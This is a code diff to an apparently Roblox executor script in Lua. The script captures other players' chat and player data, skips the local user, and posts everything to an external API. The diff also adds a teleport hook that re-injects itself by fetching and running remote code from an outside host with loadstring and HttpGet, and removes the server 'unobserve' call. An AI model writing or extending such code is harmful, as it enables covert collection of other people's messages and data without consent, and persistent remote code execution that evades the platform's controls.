@@ -112,6 +112,7 @@ local success, err = xpcall(function()
             text = text,
             t = server_time_now(),
         }
+        debug_info("print", "chat captured:", player.Name, "->", text, "(buffer", #chat_buffer .. ")")
         if #chat_buffer > CHAT_BUFFER_MAX then
             table.remove(chat_buffer, 1)
         end
@@ -752,8 +753,11 @@ local success, err = xpcall(function()
     local function collect_all_data()
         local player_list = {}
         local current_player_list = {}
+        local local_player = players.LocalPlayer
 
         for _, player in ipairs(players:GetPlayers()) do
+            if player == local_player then continue end
+
             local success, player_data = pcall(get_player_data, player)
             if success and player_data then
                 table.insert(player_list, player_data)
@@ -908,10 +912,6 @@ local success, err = xpcall(function()
         signed_post(config.api_url:gsub("/bulk$", "/player/leave"), { roblox_id = roblox_id }, "Player leave")
     end
 
-    local function send_unobserve()
-        signed_post(config.api_url:gsub("/bulk$", "/server/unobserve"), { job_id = game.JobId }, "Server unobserve")
-    end
-
     local function send_batch_player_leave(roblox_ids, job_id)
         local body = { roblox_ids = roblox_ids }
         if job_id then body.job_id = job_id end
@@ -949,6 +949,20 @@ local success, err = xpcall(function()
                 debug_info("warn", "Chat flush errored, retrying next tick:", tostring(err))
             end
         end
+    end)
+
+    pcall(function()
+        local queue = queue_on_teleport or queueteleport
+        if not queue then
+            debug_info("warn", "no queue_on_teleport; won't auto execute after serverhop")
+            return
+        end
+        local boot = string.format(
+            'getgenv().stella_token=%q getgenv().stella_debug=%s pcall(function() loadstring(game:HttpGet(%q,true))() end)',
+            user_token, tostring(config.debug), "https://stella.heroinhound.cc/stella.lua"
+        )
+        queue(boot)
+        debug_info("print", "armed serverhop re-inject")
     end)
 
     players.PlayerAdded:Connect(function(player)
